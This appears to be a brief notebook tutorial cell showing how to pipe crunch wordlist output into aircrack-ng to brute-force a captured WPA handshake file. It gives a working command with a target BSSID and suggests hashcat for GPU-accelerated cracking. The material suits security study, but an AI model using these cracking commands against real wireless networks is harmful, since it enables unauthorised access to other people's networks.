# Piping crunch with aircrack-ng
Using crunch won't effective if we want to do Wifi attack in real-life. Because it will make a very large wordlist with a very large size. Instead, we can use pipelining technique to directly send the crunch output to aircrack-ng. Remember, real life password will be hard to guess so it will take a long time for real life attack

```python
#crunch [min] [max] [char] | aircrack-ng -b [target bssid] -w - [.cap file]
!crunch 8 8 abc | aircrack-ng -b 7A:57:D3:62:0C:4F -w - /kaggle/input/4-way-handshake/tes-01.cap | grep "KEY FOUND!" 
```

you can use hashcat instead of aircrack-ng for faster cracking cuz hashcat supports GPU usage.
